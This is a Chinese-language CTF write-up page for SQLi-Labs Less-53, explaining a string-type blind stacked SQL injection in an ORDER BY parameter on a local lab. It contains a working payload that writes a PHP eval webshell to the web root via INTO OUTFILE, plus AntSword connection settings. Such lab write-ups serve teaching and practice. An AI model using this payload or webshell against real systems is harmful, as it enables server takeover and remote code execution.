@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-53 字符型盲堆叠注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-53 字符型盲堆叠注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, ORDER BY注入, 堆叠注入, WebShell, 盲注</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-53 (GET - ORDER BY - Stacked Query - Blind - String)</li>
+        <li><strong>提示：</strong>注入点为 <code>sort</code> 参数，字符型闭合（<code>ORDER BY '$id'</code>），支持多语句执行，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Less-52 的变种，同样属于盲堆叠注入环境。后端使用 <code>mysqli_multi_query()</code> 支持多语句，且屏蔽了报错与额外回显。</p>
+    <p><strong>核心区别：</strong>上下文变为字符型 <code>ORDER BY '$id'</code>。需要先使用单引号 <code>'</code> 闭合原查询，再拼接分号 <code>;</code> 执行写文件语句。由于页面只渲染正常用户表格，写文件属于“盲执行”，必须去物理服务器验证。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：中国蚁剑</h3>
+    <ul>
+        <li>URL 地址：<code>http://localhost/sqli-labs-master/Less-53/shell.php</code></li>
+        <li>连接密码：<code>cmd</code></li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：构造盲堆叠 Payload 写马</strong></p>
+    <p><strong>输入 URL：</strong><code>?sort=1'; select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-53/shell.php'-- -</code></p>
+    <p><strong>回显现象：</strong>页面正常渲染用户列表，无任何报错或写入提示。</p>
+    <p><strong>解释与原理：</strong><code>1'</code> 闭合单引号，<code>;</code> 截断原查询，执行 <code>INTO OUTFILE</code>。末尾 <code>-- -</code> 注释掉原语句尾部单引号。</p>
+
+    <p><strong>第二步：本地验证与蚁剑连接</strong></p>
+    <p>前往物理路径 <code>D:\phpstudy_pro\WWW\sqli-labs-master\Less-53\</code>，确认 <code>shell.php</code> 生成。使用蚁剑连接，成功接管目标目录。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>盲环境验证：</strong>页面正常回显表格并不代表 Payload 没执行，必须检查服务器物理文件系统确认文件落地。</li>
+        <li><strong>闭合符匹配：</strong>L52 是数字型，L53 是字符型。在堆叠注入中，正确的闭合符是语法合法的前提。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>字符型盲堆叠注入</strong>：结合闭合技术与盲执行特性，直接在底层写入 WebShell 获取控制权。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
